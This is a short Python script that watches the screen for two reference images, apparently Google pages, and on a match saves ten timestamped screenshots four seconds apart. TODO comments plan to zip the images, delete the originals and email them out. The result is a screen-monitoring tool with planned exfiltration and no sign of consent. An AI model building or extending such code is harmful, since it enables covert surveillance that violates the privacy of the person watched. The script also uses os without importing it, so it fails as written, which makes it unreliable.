import pyautogui, pyscreeze, time

#TODO compress images into zip files
#TODO delete images from the data folder after compression
#TODO implement email attachments
#TODO if a folder doesn't exist, create it

current_path = os.path.dirname(os.path.realpath(__file__))

def getCurrentDateTime():
	current_date_time = time.localtime()
	formatted_time = time.strftime('%Y%m%d-%H%M%S', current_date_time)
	return formatted_time

def takeScreenshots(amount, interval):
	for i in range(0, amount):
		date_time = getCurrentDateTime()
		pyautogui.screenshot(current_path +'/data/image'+ str(i + 1) + '_' + date_time +'.png')
		time.sleep(interval)

if __name__ == '__main__':
	while True:
		try:
			pyautogui.locateOnScreen(current_path +'/sources/google_1.png', confidence = 0.9) # Locate the image on screen with a confidence of 90%
			takeScreenshots(10, 4) # When it's located take 10 screenshots with a interval of 4 seconds
		except pyscreeze.ImageNotFoundException:
			try:
				pyautogui.locateOnScreen(current_path + '/sources/google_2.png', confidence=0.9)
				takeScreenshots(10, 4)
			except pyscreeze.ImageNotFoundException:
				pass
		time.sleep(1) # Reduces the cpu usage by about 10% while the image isn't located. Total usage between 3.5% and 5%